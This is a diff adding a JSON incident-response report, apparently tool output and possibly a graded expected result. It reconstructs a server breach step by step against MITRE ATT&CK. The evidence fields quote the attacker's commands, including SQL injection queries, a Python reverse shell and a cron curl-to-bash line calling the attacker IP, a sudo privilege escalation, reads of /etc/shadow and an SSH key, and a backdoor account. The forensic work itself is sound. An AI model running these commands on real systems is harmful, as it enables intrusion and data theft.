@@ -1,0 +1,612 @@
+{
+  "case_id": "CASE-20260918-01",
+  "title": "Multi-Stage Server Breach: Web Exploit \u2192 Reverse Shell \u2192 PrivEsc \u2192 Lateral Movement \u2192 Exfiltration",
+  "verdict": "CONFIRMED_BREACH",
+  "severity": "CRITICAL",
+  "confidence_score": "98%",
+  "time_window": {
+    "start": "2026-09-18T08:45:00+00:00",
+    "end": "2026-09-18T16:25:16+00:00"
+  },
+  "attacker_ips": [
+    "198.51.100.45"
+  ],
+  "exfiltration_ips": [
+    "203.0.113.88"
+  ],
+  "compromised_hosts": [
+    "db-prod-02",
+    "web-prod-01"
+  ],
+  "compromised_accounts": [
+    "backup_daemon",
+    "root",
+    "www-data"
+  ],
+  "mitre_attack_techniques": [
+    {
+      "technique_id": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "phase": "Reconnaissance",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application (SQLi)",
+      "phase": "Initial Access",
+      "status": "CONFIRMED",
+      "occurrences": 4
+    },
+    {
+      "technique_id": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell",
+      "phase": "Initial Access / Persistence",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "phase": "Discovery",
+      "status": "CONFIRMED",
+      "occurrences": 3
+    },
+    {
+      "technique_id": "T1059.006",
+      "technique_name": "Command and Scripting Interpreter: Python Reverse Shell",
+      "phase": "Execution / C2",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1053.003",
+      "technique_name": "Scheduled Task/Job: Cron",
+      "phase": "Persistence",
+      "status": "CONFIRMED",
+      "occurrences": 2
+    },
+    {
+      "technique_id": "T1548.003",
+      "technique_name": "Abuse Elevation Control Mechanism: Sudo Caching / Abuse",
+      "phase": "Privilege Escalation",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1003.008",
+      "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "phase": "Credential Access",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1552.004",
+      "technique_name": "Unsecured Credentials: Private Keys",
+      "phase": "Credential Access",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1136.001",
+      "technique_name": "Create Account: Local Account",
+      "phase": "Persistence / Account Creation",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1046",
+      "technique_name": "Network Service Discovery",
+      "phase": "Discovery",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1021.004",
+      "technique_name": "Remote Services: SSH",
+      "phase": "Lateral Movement",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1005",
+      "technique_name": "Data from Local System / Database Dump",
+      "phase": "Collection",
+      "status": "CONFIRMED",
+      "occurrences": 2
+    },
+    {
+      "technique_id": "T1560.001",
+      "technique_name": "Archive Collected Data: Archive via Utility",
+      "phase": "Collection / Staging",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    },
+    {
+      "technique_id": "T1048",
+      "technique_name": "Exfiltration Over Alternative Protocol",
+      "phase": "Exfiltration",
+      "status": "CONFIRMED",
+      "occurrences": 1
+    }
+  ],
+  "attack_chain_timeline": [
+    {
+      "step": 1,
+      "timestamp": "2026-09-18T08:45:00+00:00",
+      "host": "web-prod-01",
+      "phase": "Reconnaissance",
+      "mitre_id": "T1595.002",
+      "mitre_name": "Active Scanning: Vulnerability Scanning",
+      "evidence": "Attacker scanned 103 sensitive endpoints (/config.json, /solr/, /wp-admin, /actuator/health) with 404/403 responses",
+      "iocs": {
+        "src_ip": "198.51.100.45",
+        "probe_count": 103,
+        "probed_paths": [
+          "/config.json",
+          "/solr/",
+          "/wp-admin",
+          "/actuator/health",
+          "/admin/login.php"
+        ]
+      }
+    },
+    {
+      "step": 2,
+      "timestamp": "2026-09-18T10:10:22+00:00",
+      "host": "web-prod-01",
+      "phase": "Initial Access",
+      "mitre_id": "T1190",
+      "mitre_name": "Exploit Public-Facing Application (SQLi)",
+      "evidence": "GET /api/v1/products?id=1' OR '1'='1 (Status: 200)",
+      "iocs": {
+        "src_ip": "198.51.100.45",
+        "path": "/api/v1/products",
+        "query": "id=1' OR '1'='1",
+        "status": 200
+      }
+    },
+    {
+      "step": 3,
+      "timestamp": "2026-09-18T10:12:44+00:00",
+      "host": "web-prod-01",
+      "phase": "Initial Access",
+      "mitre_id": "T1190",
+      "mitre_name": "Exploit Public-Facing Application (SQLi)",
+      "evidence": "GET /api/v1/products?id=1 UNION SELECT null,version(),user()-- (Status: 200)",
+      "iocs": {
+        "src_ip": "198.51.100.45",
+        "path": "/api/v1/products",
+        "query": "id=1 UNION SELECT null,version(),user()--",
+        "status": 200
+      }
+    },
+    {
+      "step": 4,
+      "timestamp": "2026-09-18T10:14:47+00:00",
+      "host": "web-prod-01",
+      "phase": "Initial Access",
+      "mitre_id": "T1190",
+      "mitre_name": "Exploit Public-Facing Application (SQLi)",
+      "evidence": "GET /api/v1/products?id=1 UNION SELECT table_name,null,null FROM information_schema.tables-- (Status: 200)",
+      "iocs": {
+        "src_ip": "198.51.100.45",
+        "path": "/api/v1/products",
+        "query": "id=1 UNION SELECT table_name,null,null FROM information_schema.tables--",
+        "status": 200
+      }
+    },
+    {
+      "step": 5,
+      "timestamp": "2026-09-18T10:16:21+00:00",
+      "host": "web-prod-01",
+      "phase": "Initial Access",
+      "mitre_id": "T1190",
+      "mitre_name": "Exploit Public-Facing Application (SQLi)",
+      "evidence": "GET /api/v1/products?id=1 UNION SELECT username,password_hash,email FROM users WHERE is_admin=1-- (Status: 200)",
+      "iocs": {
+        "src_ip": "198.51.100.45",
+        "path": "/api/v1/products",
+        "query": "id=1 UNION SELECT username,password_hash,email FROM users WHERE is_admin=1--",
+        "status": 200
+      }
+    },
+    {
+      "step": 6,
+      "timestamp": "2026-09-18T10:25:00+00:00",
+      "host": "web-prod-01",
+      "phase": "Initial Access / Persistence",
+      "mitre_id": "T1505.003",
+      "mitre_name": "Server Software Component: Web Shell",
+      "evidence": "POST /api/v1/upload_avatar.php?filename=shell_assets.php (Status: 200)",
+      "iocs": {
+        "src_ip": "198.51.100.45",
+        "uri": "/api/v1/upload_avatar.php?filename=shell_assets.php",
+        "status": 200
+      }
+    },
+    {
+      "step": 7,
+      "timestamp": "2026-09-18T11:00:36+00:00",
+      "host": "web-prod-01",
+      "phase": "Discovery",
+      "mitre_id": "T1033",
+      "mitre_name": "System Owner/User Discovery",
+      "evidence": "whoami",
+      "iocs": {
+        "cmd": "whoami",
+        "user": "www-data",
+        "parent": "php-fpm"
+      }
+    },
+    {
+      "step": 8,
+      "timestamp": "2026-09-18T11:03:07+00:00",
+      "host": "web-prod-01",
+      "phase": "Discovery",
+      "mitre_id": "T1033",
+      "mitre_name": "System Owner/User Discovery",
+      "evidence": "id",
+      "iocs": {
+        "cmd": "id",
+        "user": "www-data",
+        "parent": "php-fpm"
+      }
+    },
+    {
+      "step": 9,
+      "timestamp": "2026-09-18T11:06:19+00:00",
+      "host": "web-prod-01",
+      "phase": "Discovery",
+      "mitre_id": "T1033",
+      "mitre_name": "System Owner/User Discovery",
+      "evidence": "uname -a",
+      "iocs": {
+        "cmd": "uname -a",
+        "user": "www-data",
+        "parent": "php-fpm"
+      }
+    },
+    {
+      "step": 10,
+      "timestamp": "2026-09-18T11:09:29+00:00",
+      "host": "web-prod-01",
+      "phase": "Execution / C2",
+      "mitre_id": "T1059.006",
+      "mitre_name": "Command and Scripting Interpreter: Python Reverse Shell",
+      "evidence": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.45\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+      "iocs": {
+        "attacker_ip": "198.51.100.45",
+        "port": "4444",
+        "cmd": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.45\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+        "user": "www-data"
+      }
+    },
+    {
+      "step": 11,
+      "timestamp": "2026-09-18T11:15:20+00:00",
+      "host": "web-prod-01",
+      "phase": "Persistence",
+      "mitre_id": "T1053.003",
+      "mitre_name": "Scheduled Task/Job: Cron",
+      "evidence": "crontab -l",
+      "iocs": {
+        "cmd": "crontab -l",
+        "user": "www-data"
+      }
+    },
+    {
+      "step": 12,
+      "timestamp": "2026-09-18T11:18:22+00:00",
+      "host": "web-prod-01",
+      "phase": "Persistence",
+      "mitre_id": "T1053.003",
+      "mitre_name": "Scheduled Task/Job: Cron",
+      "evidence": "echo '*/15 * * * * curl -s http://198.51.100.45/agent.sh | bash' >> /tmp/.cron_backup",
+      "iocs": {
+        "cmd": "echo '*/15 * * * * curl -s http://198.51.100.45/agent.sh | bash' >> /tmp/.cron_backup",
+        "user": "www-data"
+      }
+    },
+    {
+      "step": 13,
+      "timestamp": "2026-09-18T12:49:13+00:00",
+      "host": "web-prod-01",
+      "phase": "Privilege Escalation",
+      "mitre_id": "T1548.003",
+      "mitre_name": "Abuse Elevation Control Mechanism: Sudo Caching / Abuse",
+      "evidence": "sudo /usr/bin/find . -exec /bin/sh -p \\; -quit",
+      "iocs": {
+        "cmd": "sudo /usr/bin/find . -exec /bin/sh -p \\; -quit",
+        "user": "root"
+      }
+    },
+    {
+      "step": 14,
+      "timestamp": "2026-09-18T12:53:15+00:00",
+      "host": "web-prod-01",
+      "phase": "Credential Access",
+      "mitre_id": "T1003.008",
+      "mitre_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "evidence": "cat /etc/shadow",
+      "iocs": {
+        "target_file": "/etc/shadow",
+        "user": "root"
+      }
+    },
+    {
+      "step": 15,
+      "timestamp": "2026-09-18T12:57:24+00:00",
+      "host": "web-prod-01",
+      "phase": "Credential Access",
+      "mitre_id": "T1552.004",
+      "mitre_name": "Unsecured Credentials: Private Keys",
+      "evidence": "cat /root/.ssh/id_rsa",
+      "iocs": {
+        "target_key": "/root/.ssh/id_rsa",
+        "user": "root"
+      }
+    },
+    {
+      "step": 16,
+      "timestamp": "2026-09-18T13:01:17+00:00",
+      "host": "web-prod-01",
+      "phase": "Persistence / Account Creation",
+      "mitre_id": "T1136.001",
+      "mitre_name": "Create Account: Local Account",
+      "evidence": "useradd -m -s /bin/bash -p '$6$hash$sysadmin' backup_daemon",
+      "iocs": {
+        "created_user": "backup_daemon",
+        "cmd": "useradd -m -s /bin/bash -p '$6$hash$sysadmin' backup_daemon"
+      }
+    },
+    {
+      "step": 17,
+      "timestamp": "2026-09-18T14:30:36+00:00",
+      "host": "web-prod-01",
+      "phase": "Discovery",
+      "mitre_id": "T1046",
+      "mitre_name": "Network Service Discovery",
+      "evidence": "nmap -sS -p 22,3306,5432 10.0.2.0/24",
+      "iocs": {
+        "cmd": "nmap -sS -p 22,3306,5432 10.0.2.0/24",
+        "user": "root"
+      }
+    },
+    {
+      "step": 18,
+      "timestamp": "2026-09-18T14:38:36+00:00",
+      "host": "web-prod-01",
+      "phase": "Lateral Movement",
+      "mitre_id": "T1021.004",
+      "mitre_name": "Remote Services: SSH",
+      "evidence": "Lateral Movement Event: host=web-prod-01 -> target=10.0.2.20:22 cmd=\"ssh -i /tmp/stolen_id_rsa root@10.0.2.20\"",
+      "iocs": {
+        "source_host": "web-prod-01",
+        "target": "10.0.2.20:22",
+        "key": "/tmp/stolen_id_rsa"
+      }
+    },
+    {
+      "step": 19,
+      "timestamp": "2026-09-18T14:46:31+00:00",
+      "host": "db-prod-02",
+      "phase": "Collection",
+      "mitre_id": "T1005",
+      "mitre_name": "Data from Local System / Database Dump",
+      "evidence": "pg_dump -U postgres -d customer_vault -f /tmp/customers_dump.sql",
+      "iocs": {
+        "cmd": "pg_dump -U postgres -d customer_vault -f /tmp/customers_dump.sql",
+        "user": "root"
+      }
+    },
+    {
+      "step": 20,
+      "timestamp": "2026-09-18T14:54:40+00:00",
+      "host": "db-prod-02",
+      "phase": "Collection",
+      "mitre_id": "T1005",
+      "mitre_name": "Data from Local System / Database Dump",
+      "evidence": "pg_dump -U postgres -d payment_gateway -f /tmp/payments_dump.sql",
+      "iocs": {
+        "cmd": "pg_dump -U postgres -d payment_gateway -f /tmp/payments_dump.sql",
+        "user": "root"
+      }
+    },
+    {
+      "step": 21,
+      "timestamp": "2026-09-18T16:17:00+00:00",
+      "host": "db-prod-02",
+      "phase": "Collection / Staging",
+      "mitre_id": "T1560.001",
+      "mitre_name": "Archive Collected Data: Archive via Utility",
+      "evidence": "tar -czf /tmp/vault_backup.tar.gz /tmp/*.sql",
+      "iocs": {
+        "cmd": "tar -czf /tmp/vault_backup.tar.gz /tmp/*.sql",
+        "archive_file": "/tmp/vault_backup.tar.gz"
+      }
+    },
+    {
+      "step": 22,
+      "timestamp": "2026-09-18T16:25:16+00:00",
+      "host": "web-prod-01",
+      "phase": "Exfiltration",
+      "mitre_id": "T1048",
+      "mitre_name": "Exfiltration Over Alternative Protocol",
+      "evidence": "Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88",
+      "iocs": {
+        "dst_ip": "203.0.113.88",
+        "port": 443,
+        "alert": "Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88"
+      }
+    }
+  ],
+  "extracted_iocs": [
+    {
+      "value": "198.51.100[.]45",
+      "raw_value": "198.51.100.45",
+      "type": "IPv4",
+      "role": "Attacker / C2",
+      "description": "Initial scanner, SQLi source, and reverse shell listener"
+    },
+    {
+      "value": "203.0.113[.]88",
+      "raw_value": "203.0.113.88",
+      "type": "IPv4",
+      "role": "Exfiltration Destination",
+      "description": "Destination for high-volume database archive outbound POST"
+    },
+    {
+      "value": "198.51.100.45",
+      "raw_value": "198.51.100.45",
+      "type": "src_ip",
+      "role": "Reconnaissance",
+      "description": "Observed in T1595.002 (web-prod-01)"
+    },
+    {
+      "value": "103",
+      "raw_value": "103",
+      "type": "probe_count",
+      "role": "Reconnaissance",
+      "description": "Observed in T1595.002 (web-prod-01)"
+    },
+    {
+      "value": "['/config.json', '/solr/', '/wp-admin', '/actuator/health', '/admin/login.php']",
+      "raw_value": "['/config.json', '/solr/', '/wp-admin', '/actuator/health', '/admin/login.php']",
+      "type": "probed_paths",
+      "role": "Reconnaissance",
+      "description": "Observed in T1595.002 (web-prod-01)"
+    },
+    {
+      "value": "/api/v1/products",
+      "raw_value": "/api/v1/products",
+      "type": "path",
+      "role": "Initial Access",
+      "description": "Observed in T1190 (web-prod-01)"
+    },
+    {
+      "value": "/api/v1/upload_avatar.php?filename=shell_assets.php",
+      "raw_value": "/api/v1/upload_avatar.php?filename=shell_assets.php",
+      "type": "uri",
+      "role": "Initial Access / Persistence",
+      "description": "Observed in T1505.003 (web-prod-01)"
+    },
+    {
+      "value": "php-fpm",
+      "raw_value": "php-fpm",
+      "type": "parent",
+      "role": "Discovery",
+      "description": "Observed in T1033 (web-prod-01)"
+    },
+    {
+      "value": "198.51.100.45",
+      "raw_value": "198.51.100.45",
+      "type": "attacker_ip",
+      "role": "Execution / C2",
+      "description": "Observed in T1059.006 (web-prod-01)"
+    },
+    {
+      "value": "4444",
+      "raw_value": "4444",
+      "type": "port",
+      "role": "Execution / C2",
+      "description": "Observed in T1059.006 (web-prod-01)"
+    },
+    {
+      "value": "/etc/shadow",
+      "raw_value": "/etc/shadow",
+      "type": "target_file",
+      "role": "Credential Access",
+      "description": "Observed in T1003.008 (web-prod-01)"
+    },
+    {
+      "value": "/root/.ssh/id_rsa",
+      "raw_value": "/root/.ssh/id_rsa",
+      "type": "target_key",
+      "role": "Credential Access",
+      "description": "Observed in T1552.004 (web-prod-01)"
+    },
+    {
+      "value": "backup_daemon",
+      "raw_value": "backup_daemon",
+      "type": "created_user",
+      "role": "Persistence / Account Creation",
+      "description": "Observed in T1136.001 (web-prod-01)"
+    },
+    {
+      "value": "web-prod-01",
+      "raw_value": "web-prod-01",
+      "type": "source_host",
+      "role": "Lateral Movement",
+      "description": "Observed in T1021.004 (web-prod-01)"
+    },
+    {
+      "value": "10.0.2.20:22",
+      "raw_value": "10.0.2.20:22",
+      "type": "target",
+      "role": "Lateral Movement",
+      "description": "Observed in T1021.004 (web-prod-01)"
+    },
+    {
+      "value": "/tmp/stolen_id_rsa",
+      "raw_value": "/tmp/stolen_id_rsa",
+      "type": "key",
+      "role": "Lateral Movement",
+      "description": "Observed in T1021.004 (web-prod-01)"
+    },
+    {
+      "value": "/tmp/vault_backup.tar.gz",
+      "raw_value": "/tmp/vault_backup.tar.gz",
+      "type": "archive_file",
+      "role": "Collection / Staging",
+      "description": "Observed in T1560.001 (db-prod-02)"
+    },
+    {
+      "value": "203.0.113.88",
+      "raw_value": "203.0.113.88",
+      "type": "dst_ip",
+      "role": "Exfiltration",
+      "description": "Observed in T1048 (web-prod-01)"
+    },
+    {
+      "value": "443",
+      "raw_value": "443",
+      "type": "port",
+      "role": "Exfiltration",
+      "description": "Observed in T1048 (web-prod-01)"
+    },
+    {
+      "value": "Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88",
+      "raw_value": "Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88",
+      "type": "alert",
+      "role": "Exfiltration",
+      "description": "Observed in T1048 (web-prod-01)"
+    },
+    {
+      "value": "backup_daemon",
+      "raw_value": "backup_daemon",
+      "type": "Account",
+      "role": "Backdoor Account",
+      "description": "User account leveraged during attack"
+    },
+    {
+      "value": "root",
+      "raw_value": "root",
+      "type": "Account",
+      "role": "Compromised Account",
+      "description": "User account leveraged during attack"
+    },
+    {
+      "value": "www-data",
+      "raw_value": "www-data",
+      "type": "Account",
+      "role": "Compromised Account",
+      "description": "User account leveraged during attack"
+    }
+  ],
+  "scoring_hash_metadata": {
+    "source_file": "elasticsearch_export.json",
+    "total_events_analyzed": 15000,
+    "stages_count": 22
+  }
+}
